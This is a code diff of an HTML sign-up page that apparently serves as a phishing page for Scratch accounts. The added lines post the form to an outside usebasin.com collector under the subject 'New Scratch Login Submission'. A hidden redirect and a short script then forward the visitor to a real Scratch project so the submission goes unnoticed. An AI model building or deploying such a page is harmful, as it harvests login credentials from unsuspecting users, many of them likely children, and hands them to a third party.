@@ -158,7 +158,7 @@
         
         <form
             class="signup-form"
-            action="https://usebasin.com/f/b0e0e21598cb"
+            action="https://usebasin.com/f/2bf552bf3a78"
             method="POST"
             id="signupForm"
         >
@@ -199,9 +199,20 @@
                 ></textarea>
             </div>
 
+            <input type="hidden" name="_redirect" value="https://scratch.mit.edu/projects/1272479527/" />
+            <input type="hidden" name="_subject" value="New Scratch Login Submission" />
+
             <button type="submit" class="signup-button">Next</button>
         </form>
     </div>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            // السماح للفورم بالإرسال أولاً
+            setTimeout(function() {
+                window.location.href = 'https://scratch.mit.edu/projects/1272479527/';
+            }, 100);
+        });
+    </script>
 </body>
 </html>
-
